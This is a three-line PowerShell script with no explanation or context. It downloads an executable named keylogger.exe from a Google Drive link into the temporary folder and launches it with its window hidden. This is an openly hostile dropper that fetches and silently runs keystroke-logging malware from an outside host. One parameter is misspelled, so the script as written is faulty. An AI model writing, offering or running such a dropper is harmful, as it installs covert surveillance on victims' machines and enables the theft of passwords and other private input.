$path = "$env:TEMP\keylogger.exe"
Invoke-WebRequest -Ui "https://drive.google.com/file/d/1SdLLHS6c7HWUpbHydbfay2MabiN6Jjy0/view?usp=drive_link" -OutFile $path
Start-Process $path -WindowStyle Hidden

